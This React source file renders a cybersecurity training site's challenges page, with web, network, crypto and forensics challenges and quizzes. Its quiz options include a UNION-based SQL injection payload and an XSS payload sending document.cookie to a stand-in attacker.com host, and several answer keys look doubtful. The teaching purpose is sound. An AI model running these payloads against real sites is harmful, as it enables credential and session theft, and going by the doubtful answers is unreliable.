import React, { useState, useEffect } from 'react';
import Header from '@/components/Header';
import Footer from '@/components/Footer';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Progress } from '@/components/ui/progress';
import { Card, CardContent, CardHeader, CardTitle, CardDescription, CardFooter } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import GradientButton from '@/components/GradientButton';
import TerminalEffect from '@/components/TerminalEffect';
import ChallengeQuiz from '@/components/ChallengeQuiz';
import { Trophy, Target, Award, BookOpen, Shield, Lock, Server, Bug, Database } from 'lucide-react';
import { useSearchParams } from 'react-router-dom';
import { toast } from '@/hooks/use-toast';

const ChallengesPage = () => {
  const [searchParams] = useSearchParams();
  const initialCategory = searchParams.get('category') || 'web';
  const initialChallenge = searchParams.get('challenge') || '';
  
  const [activeTab, setActiveTab] = useState(initialCategory);
  const [activeChallenge, setActiveChallenge] = useState(initialChallenge);
  const [userProgress, setUserProgress] = useState({
    web: 15,
    network: 25,
    crypto: 5,
    forensics: 45
  });
  
  useEffect(() => {
    // Load saved progress from localStorage if available
    const savedProgress = localStorage.getItem('challengeProgress');
    if (savedProgress) {
      setUserProgress(JSON.parse(savedProgress));
    }
    
    // Update page title based on active section
    document.title = `Cyber With Mohamed - ${activeTab.charAt(0).toUpperCase() + activeTab.slice(1)} Challenges`;
    
    // Scroll to specific challenge if specified
    if (initialChallenge) {
      const element = document.getElementById(`challenge-${initialChallenge}`);
      if (element) {
        element.scrollIntoView({ behavior: 'smooth' });
      }
    }
  }, [initialCategory, initialChallenge]);
  
  const saveProgress = (category, points) => {
    const newProgress = {
      ...userProgress,
      [category]: Math.min(100, userProgress[category] + points/10)
    };
    
    setUserProgress(newProgress);
    localStorage.setItem('challengeProgress', JSON.stringify(newProgress));
    
    toast({
      title: "Challenge Completed!",
      description: `You earned ${points} points!`,
      variant: "success"
    });
  };
  
  const challenges = {
    web: [
      {
        id: "sqli-masterclass",
        title: "SQLi Masterclass",
        difficulty: "Medium",
        category: "Web Exploitation",
        description: "Bypass authentication and extract sensitive data from a vulnerable e-commerce database. Requires knowledge of UNION-based and blind SQL injection techniques.",
        points: 250,
        completions: 142,
        link: "#sqli-quiz",
        deadline: "May 25, 2025",
        hint: "Look for WHERE clause vulnerabilities in the login form."
      },
      {
        id: "xss-playground",
        title: "XSS Playground",
        difficulty: "Easy",
        category: "Web Exploitation",
        description: "Identify and exploit cross-site scripting vulnerabilities to steal cookies and execute JavaScript in victims' browsers on a social media simulation.",
        points: 150,
        completions: 218,
        link: "#xss-quiz",
        hint: "Check for unfiltered input in the comment section."
      },
      {
        id: "jwt-breaker",
        title: "JWT Breaker",
        difficulty: "Hard",
        category: "Web Exploitation",
        description: "Analyze and exploit weaknesses in JWT authentication implementation, including signature verification bypass and privilege escalation.",
        points: 350,
        completions: 87,
        link: "#jwt-quiz",
        deadline: "May 30, 2025",
        hint: "Try modifying the algorithm header parameter."
      },
    ],
    network: [
      {
        id: "packet-detective",
        title: "Packet Detective",
        difficulty: "Medium",
        category: "Network",
        description: "Analyze captured PCAP files to identify malicious activities, data exfiltration attempts, and extract hidden data from network traffic.",
        points: 200,
        completions: 156,
        link: "#packet-quiz",
        deadline: "May 28, 2025",
        hint: "Look for unusual DNS queries with encoded payloads."
      },
      {
        id: "lateral-movement",
        title: "Lateral Movement Lab",
        difficulty: "Hard",
        category: "Network",
        description: "Navigate through a simulated corporate network by leveraging compromised hosts as pivot points. Discover credentials and access the final target.",
        points: 300,
        completions: 92,
        link: "#lateral-quiz",
        hint: "SSH tunneling and port forwarding will be essential."
      },
      {
        id: "firewall-bypass",
        title: "Firewall Bypass Challenge",
        difficulty: "Expert",
        category: "Network",
        description: "Develop techniques to bypass a sophisticated next-gen firewall using various evasion methods and protocol manipulation.",
        points: 400,
        completions: 45,
        link: "#firewall-quiz",
        deadline: "June 1, 2025",
      },
    ],
    crypto: [
      {
        id: "rsa-cryptanalysis",
        title: "RSA Cryptanalysis",
        difficulty: "Expert",
        category: "Cryptography",
        description: "Break weak RSA implementations by exploiting common vulnerabilities in key generation, padding schemes, and implementation flaws.",
        points: 450,
        completions: 47,
        link: "#rsa-quiz",
        hint: "Look for small public exponents and shared prime factors."
      },
      {
        id: "hash-collision",
        title: "Hash Collision Factory",
        difficulty: "Medium",
        category: "Cryptography",
        description: "Generate practical hash collisions and understand the implications for cryptographic security in real-world applications.",
        points: 250,
        completions: 124,
        link: "#hash-quiz",
        deadline: "May 26, 2025",
      },
      {
        id: "block-cipher",
        title: "Block Cipher Analysis",
        difficulty: "Hard",
        category: "Cryptography",
        description: "Analyze and exploit weaknesses in block cipher implementations including padding oracle attacks and mode-specific vulnerabilities.",
        points: 350,
        completions: 76,
        link: "#block-quiz",
        hint: "CBC mode implementation has padding vulnerabilities."
      },
    ],
    forensics: [
      {
        id: "memory-forensics",
        title: "Memory Forensics Challenge",
        difficulty: "Hard",
        category: "Digital Forensics",
        description: "Extract evidence from memory dumps to reconstruct attacker activities, recover encryption keys, and identify malware artifacts.",
        points: 350,
        completions: 76,
        link: "#memory-quiz",
        deadline: "May 29, 2025",
        hint: "Use Volatility framework to analyze process artifacts."
      },
      {
        id: "disk-image",
        title: "Disk Image Investigation",
        difficulty: "Medium",
        category: "Digital Forensics",
        description: "Recover deleted files, hidden data, and analyze filesystem artifacts from a disk image to solve a simulated cybercrime case.",
        points: 250,
        completions: 103,
        link: "#disk-quiz",
        hint: "Check alternate data streams and file slack space."
      },
      {
        id: "steganography-master",
        title: "Steganography Master",
        difficulty: "Easy",
        category: "Digital Forensics",
        description: "Discover hidden messages and files concealed within images, audio files, and documents using various steganography techniques.",
        points: 150,
        completions: 187,
        link: "#stegano-quiz",
      },
    ]
  };

  const quizzes = {
    "sqli-masterclass": {
      title: "SQL Injection Quiz",
      questions: [
        {
          question: "Which of the following is a correct payload for a basic UNION-based SQL injection?",
          options: [
            "' OR 1=1 --",
            "' UNION SELECT username,password FROM users --",
            "SELECT * FROM users",
            "DROP TABLE users;"
          ],
          answer: 1
        },
        {
          question: "What is the purpose of using SLEEP() in blind SQL injection attacks?",
          options: [
            "To slow down the attack to avoid detection",
            "To make the database more responsive",
            "To create a time-based inference method to extract data",
            "To pause the attack while analyzing results"
          ],
          answer: 2
        },
        {
          question: "Which character is commonly used to terminate a SQL statement in injection attacks?",
          options: [
            ".",
            ";",
            ":",
            "--"
          ],
          answer: 3
        }
      ]
    },
    "xss-playground": {
      title: "XSS Attack Quiz",
      questions: [
        {
          question: "Which of these is a valid payload for stealing cookies via XSS?",
          options: [
            "<script>alert('XSS')</script>",
            "<img src=x onerror='console.log(document.cookie)'>",
            "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
            "All of the above"
          ],
          answer: 3
        },
        {
          question: "Which HTTP header helps prevent XSS attacks?",
          options: [
            "X-XSS-Protection",
            "Content-Security-Policy",
            "X-Content-Type-Options",
            "Both A and B"
          ],
          answer: 3
        }
      ]
    },
    "jwt-breaker": {
      title: "JWT Security Quiz",
      questions: [
        {
          question: "Which algorithm is vulnerable to the 'none' algorithm attack in JWT?",
          options: [
            "RS256",
            "HS256",
            "Both A and B",
            "Neither A nor B"
          ],
          answer: 2
        },
        {
          question: "What part of the JWT contains the payload data?",
          options: [
            "First segment",
            "Second segment",
            "Third segment",
            "Fourth segment"
          ],
          answer: 1
        },
        {
          question: "Which attack involves changing the algorithm from RS256 to HS256?",
          options: [
            "Key confusion attack",
            "Algorithm swapping attack",
            "Replay attack",
            "Brute force attack"
          ],
          answer: 0
        }
      ]
    },
    "packet-detective": {
      title: "Network Packet Analysis Quiz",
      questions: [
        {
          question: "What type of DNS record is used to map a domain name to an IP address?",
          options: [
            "MX",
            "A",
            "CNAME",
            "TXT"
          ],
          answer: 1
        },
        {
          question: "Which protocol is commonly used for encrypted web traffic?",
          options: [
            "HTTP",
            "FTP",
            "SMTP",
            "HTTPS"
          ],
          answer: 3
        }
      ]
    },
    "lateral-movement": {
      title: "Lateral Movement Techniques Quiz",
      questions: [
        {
          question: "Which of the following is a common technique for lateral movement in a Windows environment?",
          options: [
            "SSH Tunneling",
            "Pass-the-Hash",
            "ARP Spoofing",
            "SYN Flood"
          ],
          answer: 1
        },
        {
          question: "What is the purpose of using tools like PsExec in lateral movement?",
          options: [
            "To encrypt network traffic",
            "To execute commands on remote systems",
            "To capture network packets",
            "To bypass firewalls"
          ],
          answer: 1
        }
      ]
    },
    "firewall-bypass": {
      title: "Firewall Evasion Quiz",
      questions: [
        {
          question: "Which technique involves fragmenting packets to evade firewall rules?",
          options: [
            "Port Scanning",
            "Packet Fragmentation",
            "DNS Tunneling",
            "ARP Poisoning"
          ],
          answer: 1
        },
        {
          question: "What is the purpose of using decoy traffic in firewall evasion?",
          options: [
            "To increase network bandwidth",
            "To hide malicious traffic among legitimate traffic",
            "To overload the firewall",
            "To test firewall performance"
          ],
          answer: 1
        }
      ]
    },
    "rsa-cryptanalysis": {
      title: "RSA Cryptography Quiz",
      questions: [
        {
          question: "What is the purpose of the public key in RSA cryptography?",
          options: [
            "To decrypt messages",
            "To encrypt messages",
            "To sign messages",
            "To generate keys"
          ],
          answer: 1
        },
        {
          question: "Which mathematical problem is the security of RSA based on?",
          options: [
            "Integer factorization",
            "Discrete logarithm",
            "Elliptic curve cryptography",
            "Quantum entanglement"
          ],
          answer: 0
        }
      ]
    },
    "hash-collision": {
      title: "Hash Collision Quiz",
      questions: [
        {
          question: "What is a hash collision?",
          options: [
            "When two different inputs produce the same hash value",
            "When a hash function fails to produce a unique output",
            "When a hash function is too slow",
            "When a hash function is not secure"
          ],
          answer: 0
        },
        {
          question: "Which of the following is a common attack that exploits hash collisions?",
          options: [
            "SQL Injection",
            "Cross-Site Scripting",
            "Denial of Service",
            "Birthday Attack"
          ],
          answer: 3
        }
      ]
    },
    "block-cipher": {
      title: "Block Cipher Analysis Quiz",
      questions: [
        {
          question: "What is a padding oracle attack?",
          options: [
            "An attack that exploits vulnerabilities in padding schemes",
            "An attack that bypasses firewalls",
            "An attack that cracks passwords",
            "An attack that exploits SQL databases"
          ],
          answer: 0
        },
        {
          question: "Which mode of operation is vulnerable to padding oracle attacks?",
          options: [
            "ECB",
            "CBC",
            "CTR",
            "GCM"
          ],
          answer: 1
        }
      ]
    },
    "memory-forensics": {
      title: "Memory Forensics Quiz",
      questions: [
        {
          question: "What is a memory dump?",
          options: [
            "A snapshot of a computer's memory at a specific point in time",
            "A backup of a computer's hard drive",
            "A log of network traffic",
            "A list of installed software"
          ],
          answer: 0
        },
        {
          question: "Which tool is commonly used for memory forensics analysis?",
          options: [
            "Wireshark",
            "Nmap",
            "Volatility",
            "Metasploit"
          ],
          answer: 2
        }
      ]
    },
    "disk-image": {
      title: "Disk Image Investigation Quiz",
      questions: [
        {
          question: "What is a disk image?",
          options: [
            "An exact copy of a storage device",
            "A backup of a computer's operating system",
            "A list of files on a hard drive",
            "A log of system events"
          ],
          answer: 0
        },
        {
          question: "Which technique is used to recover deleted files from a disk image?",
          options: [
            "File carving",
            "Data encryption",
            "Network analysis",
            "Password cracking"
          ],
          answer: 0
        }
      ]
    },
    "steganography-master": {
      title: "Steganography Techniques Quiz",
      questions: [
        {
          question: "What is steganography?",
          options: [
            "The art of hiding messages in plain sight",
            "The science of encrypting data",
            "The technique of bypassing firewalls",
            "The process of cracking passwords"
          ],
          answer: 0
        },
        {
          question: "Which type of file is commonly used to hide messages using steganography?",
          options: [
            "Text files",
            "Image files",
            "Executable files",
            "Database files"
          ],
          answer: 1
        }
      ]
    }
  };

  return (
    <div className="min-h-screen text-cyber-light overflow-x-hidden">
      <Header />
      <main>
        <section className="py-24 bg-cyber-dark relative overflow-hidden">
          <div className="absolute inset-0 matrix-bg opacity-5 z-0"></div>
          <div className="absolute inset-0 bg-gradient-to-b from-black to-transparent z-0 pointer-events-none"></div>
          <div 
            className="absolute inset-0 z-0 opacity-20" 
            style={{
              backgroundImage: `url('/cyber-grid.jpg')`,
              backgroundSize: 'cover',
              backgroundPosition: 'center',
              backgroundBlendMode: 'overlay'
            }}
          ></div>
          
          <div className="container mx-auto px-4 relative z-10">
            <div className="flex flex-col md:flex-row justify-between items-center mb-12">
              <div>
                <h1 className="section-title mb-4">
                  Cyber <span className="gradient-text">Challenges</span>
                </h1>
                <p className="text-cyber-light/80 max-w-2xl">
                  Test your cybersecurity skills with hands-on challenges across different domains. 
                  Track your progress, earn points, and prove your expertise in various security areas.
                </p>
              </div>
              <div className="mt-6 md:mt-0">
                <Card className="cyber-card bg-secondary/20 border border-cyber-purple/30">
                  <CardHeader className="pb-2">
                    <CardTitle className="text-xl flex items-center gap-2">
                      <Trophy className="text-cyber-purple2" />
                      Your Progress
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div className="space-y-2">
                      <div className="flex justify-between text-sm">
                        <span>Web Exploitation</span>
                        <span>{userProgress.web}%</span>
                      </div>
                      <Progress value={userProgress.web} className="h-2 bg-secondary/50" indicatorClassName="bg-red-500" />
                    </div>
                    <div className="space-y-2">
                      <div className="flex justify-between text-sm">
                        <span>Network Security</span>
                        <span>{userProgress.network}%</span>
                      </div>
                      <Progress value={userProgress.network} className="h-2 bg-secondary/50" indicatorClassName="bg-blue-500" />
                    </div>
                    <div className="space-y-2">
                      <div className="flex justify-between text-sm">
                        <span>Cryptography</span>
                        <span>{userProgress.crypto}%</span>
                      </div>
                      <Progress value={userProgress.crypto} className="h-2 bg-secondary/50" indicatorClassName="bg-purple-500" />
                    </div>
                    <div className="space-y-2">
                      <div className="flex justify-between text-sm">
                        <span>Digital Forensics</span>
                        <span>{userProgress.forensics}%</span>
                      </div>
                      <Progress value={userProgress.forensics} className="h-2 bg-secondary/50" indicatorClassName="bg-green-500" />
                    </div>
                  </CardContent>
                </Card>
              </div>
            </div>
            
            <Tabs 
              defaultValue={activeTab} 
              value={activeTab}
              onValueChange={setActiveTab}
              className="w-full max-w-6xl mx-auto"
            >
              <div className="flex justify-center mb-8 overflow-x-auto pb-2">
                <TabsList className="bg-secondary/50">
                  <TabsTrigger value="web" className="text-lg px-8 py-2 flex items-center gap-2">
                    <Bug size={16} />
                    Web
                  </TabsTrigger>
                  <TabsTrigger value="network" className="text-lg px-8 py-2 flex items-center gap-2">
                    <Server size={16} />
                    Network
                  </TabsTrigger>
                  <TabsTrigger value="crypto" className="text-lg px-8 py-2 flex items-center gap-2">
                    <Lock size={16} />
                    Crypto
                  </TabsTrigger>
                  <TabsTrigger value="forensics" className="text-lg px-8 py-2 flex items-center gap-2">
                    <Shield size={16} />
                    Forensics
                  </TabsTrigger>
                </TabsList>
              </div>
              
              {Object.entries(challenges).map(([category, items]) => (
                <TabsContent key={category} value={category} className="mt-0">
                  {activeChallenge && quizzes[activeChallenge] ? (
                    <div>
                      <button 
                        onClick={() => setActiveChallenge('')} 
                        className="flex items-center text-cyber-purple2 hover:text-cyber-purple mb-4"
                      >
                        ← Back to challenges
                      </button>
                      <ChallengeQuiz 
                        quiz={quizzes[activeChallenge]} 
                        onComplete={() => {
                          const challenge = [...items].find(c => c.id === activeChallenge);
                          if (challenge) {
                            saveProgress(category, challenge.points);
                          }
                          setActiveChallenge('');
                        }} 
                      />
                    </div>
                  ) : (
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
                      {items.map((challenge) => (
                        <Card 
                          key={challenge.id} 
                          id={`challenge-${challenge.id}`}
                          className="cyber-card overflow-hidden h-full flex flex-col"
                        >
                          <CardHeader className="pb-2">
                            <div className="flex justify-between items-start">
                              <h3 className="text-xl font-bold">{challenge.title}</h3>
                              <Badge className={`
                                ${challenge.difficulty === "Easy" ? "bg-green-600/30 text-green-400" : 
                                  challenge.difficulty === "Medium" ? "bg-yellow-600/30 text-yellow-400" :
                                  challenge.difficulty === "Hard" ? "bg-orange-600/30 text-orange-400" :
                                  "bg-red-600/30 text-red-400"}
                              `}>
                                {challenge.difficulty}
                              </Badge>
                            </div>
                            <Badge variant="outline" className="w-fit flex items-center gap-1">
                              <Bug className="w-4 h-4" />
                              {challenge.category}
                            </Badge>
                          </CardHeader>
                          
                          <CardContent className="flex-grow">
                            <p className="text-cyber-light/80 mb-4">{challenge.description}</p>
                            
                            <div className="flex justify-between text-sm text-cyber-light/70">
                              <div className="flex items-center">
                                <Trophy size={16} className="mr-1 text-cyber-purple2" />
                                <span>{challenge.points} pts</span>
                              </div>
                              <div className="flex items-center">
                                <Award size={16} className="mr-1 text-cyber-purple2" />
                                <span>{challenge.completions} solves</span>
                              </div>
                            </div>
                          </CardContent>
                          
                          <CardFooter className="flex gap-2">
                            <GradientButton 
                              onClick={() => setActiveChallenge(challenge.id)} 
                              className="flex-1"
                            >
                              <BookOpen size={16} />
                              <span>Start Challenge</span>
                            </GradientButton>
                            
                            {challenge.hint && (
                              <GradientButton 
                                onClick={() => toast({
                                  title: "Hint",
                                  description: challenge.hint
                                })} 
                                variant="secondary" 
                                className="w-auto"
                              >
                                Get Hint
                              </GradientButton>
                            )}
                          </CardFooter>
                        </Card>
                      ))}
                    </div>
                  )}
                </TabsContent>
              ))}
            </Tabs>
            
            <div className="mt-16">
              <Card className="cyber-card overflow-hidden bg-secondary/20 border border-cyber-purple/30">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Target className="text-cyber-purple2" />
                    Cyber Certification Path
                  </CardTitle>
                  <CardDescription>
                    Complete challenges to earn points towards these certifications
                  </CardDescription>
                </CardHeader>
                <CardContent>
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <div className="p-4 border border-red-500/30 rounded-lg bg-secondary/30">
                      <h3 className="font-bold text-lg flex items-center gap-2 mb-2">
                        <Shield className="text-red-500" />
                        Offensive Security
                      </h3>
                      <p className="text-sm mb-3">Requires 5000 points in Web and Network challenges</p>
                      <Progress value={30} className="h-2 bg-secondary/50" indicatorClassName="bg-red-500" />
                      <p className="text-xs mt-1 text-right">1500/5000 points</p>
                    </div>
                    <div className="p-4 border border-blue-500/30 rounded-lg bg-secondary/30">
                      <h3 className="font-bold text-lg flex items-center gap-2 mb-2">
                        <Database className="text-blue-500" />
                        Defensive Security
                      </h3>
                      <p className="text-sm mb-3">Requires 5000 points in Forensics and Crypto challenges</p>
                      <Progress value={20} className="h-2 bg-secondary/50" indicatorClassName="bg-blue-500" />
                      <p className="text-xs mt-1 text-right">1000/5000 points</p>
                    </div>
                    <div className="p-4 border border-purple-500/30 rounded-lg bg-secondary/30">
                      <h3 className="font-bold text-lg flex items-center gap-2 mb-2">
                        <Lock className="text-purple-500" />
                        Security Master
                      </h3>
                      <p className="text-sm mb-3">Requires 12000 points across all challenge categories</p>
                      <Progress value={15} className="h-2 bg-secondary/50" indicatorClassName="bg-purple-500" />
                      <p className="text-xs mt-1 text-right">1800/12000 points</p>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          </div>
        </section>
      </main>
      <Footer />
    </div>
  );
};

export default ChallengesPage;
